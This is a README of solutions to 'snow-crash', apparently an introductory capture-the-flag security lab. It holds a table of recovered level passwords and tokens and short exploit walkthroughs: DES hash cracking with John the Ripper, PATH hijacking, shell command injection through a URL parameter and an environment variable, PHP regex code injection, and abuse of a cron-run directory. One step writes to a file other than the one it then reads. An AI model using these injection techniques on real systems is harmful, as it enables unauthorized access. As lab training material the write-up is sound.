# snow-crash
This project will be an introduction to cyber security.

## Passwords

| User    | Password                  |
| :-----: |:-------------------------:|
| level00 | level00                   |
| flag00  | nottoohardhere            |
| level01 | x24ti5gi3x0ol2eh4esiuxias |
| flag01  | abcdefg                   |
| level02 | f2av5il02puano7naaf6adaaf |
| flag02  | ft_waNDReL0L              |
| level03 | kooda2puivaav1idi4f57q8iq |
| level04 | qi0maab88jeaj46qoumi7maus |
| level05 | ne2searoevaevoem4ov4ar8ap |
| level06 | viuaaale9huek52boumoomioc |
| level07 | wiok45aaoguiboiki2tuin6ub |
| level08 | fiumuikeil55xe9cu4dood66h |

## Script

### level00

```bash
level00@SnowCrash:~$ find / -user flag00 2>/dev/null
/usr/sbin/john
/rofs/usr/sbin/john
```

```bash
level00@SnowCrash:~$ cat /usr/sbin/john
cdiiddwpgswtgt
```

- [identify encryption method](https://www.dcode.fr/identification-chiffrement)
- [decrypt cesar code](https://www.dcode.fr/chiffre-cesar)

### level01

```bash
flag00@SnowCrash:~$ cat /etc/passwd | grep flag01
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

Using ``john the ripper`` I was able to find corresponding password.

```bash
user@hostname:~$ echo "42hDRfypTqqnw" > /tmp/password-file && john /tmp/password-file && john -show /tmp/password-file
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
No password hashes left to crack (see FAQ)
?:abcdefg
1 password hash cracked, 0 left
```

### level02

Open ``level02.pcap`` in wireshark then Statistics -> Conversations -> Tab TCP -> Follow Stream

### level03

```bash
level03@SnowCrash:~$ strings ./level03 | grep Exploit
/usr/bin/env echo Exploit me
level03@SnowCrash:~$ cp /bin/getflag ./echo
level03@SnowCrash:~$ PATH=$PWD ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

### level04

```bash
level04@SnowCrash:~$ curl localhost:4747?x='$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

### level05

```bash
echo "getflag > /tmp/log" > /opt/openarenaserver/foo
sleep 120
cat /tmp/foo
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

### level06

```bash
level06@SnowCrash:~$ echo '[x {$z(getflag)}]' > file
level06@SnowCrash:~$ ./level06 file shell_exec
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag x Here is your token : wiok45aaoguiboiki2tuin6ub
```

### level07

```bash
level07@SnowCrash:~$ LOGNAME='`getflag`' ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
